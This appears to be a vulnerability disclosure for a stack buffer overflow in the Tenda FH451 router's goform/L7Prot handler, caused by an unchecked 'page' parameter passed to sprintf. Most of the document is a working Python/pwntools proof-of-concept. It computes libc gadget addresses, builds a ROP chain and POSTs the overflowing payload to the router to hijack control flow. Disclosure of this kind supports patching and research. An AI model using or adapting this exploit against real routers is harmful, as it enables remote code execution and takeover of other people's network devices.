# Shenzhen Jixiang Tengda Technology Co., Ltd. FH451 has a Remote Code Execution vulnerability

**Vulnerability URL**: [http://0.0.0.0:80/goform/L7Prot](http://0.0.0.0:80/goform/L7Prot)

**Firmware Download Link:** [https://www.tenda.com.cn/material/show/1629](https://www.tenda.com.cn/material/show/1629)

## Vulnerability Analysis
The vulnerability occurs in the `frmL7ProtForm` function.

![Image 1](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/L7Prot1.png)

![Image 2](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/L7Prot2.png)

The program retrieves the user input parameter `page` at line 214 but does not perform any size check. When the parameter value is excessively large, it will causes a stack overflow in the `sprintf` function at line 215, which can lead to a program crash or potential exploitation.  
Cross-referenced location: from the `frmL7ProtForm` function, routed to `L7Prot`, at line 46.

![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/L7Prot3.png)

Further cross-referenced to the `sub_64EAC` function, with attention to lines 44 and 47.
![Image 4](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)

It can be determined that the vulnerability occurs at the page path `goform/L7Prot`.

## payload
```python
import requests
from pwn import *

libc = ELF('./squashfs-root/lib/libc.so.0')
system_offset = libc.symbols["system"]
#base = 0x3fe4a990
base = 0x3fe36000
system_addr = base + system_offset
puts = base+libc.symbols['puts']
str = b"hello-I-am-fzz\x00"
mov_r0 = base+0x00040cb8 # mov r0, sp; blx r3;
pop_r3 = base+0x00018298 # pop {r3, pc};
payload = b'a'*107 + p32(pop_r3)+p32(puts)+p32(mov_r0)+str
IP = '0.0.0.0:80'
url = f"http://{IP}/goform/L7Prot"
data = {
    "page": payload
}
ret = requests.post(url,data=data)
```

# reproduce
![Image 5](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/L7Prot4.png)
![Image 6](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/L7Prot5.png)
![Image 7](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/L7Prot6.png)
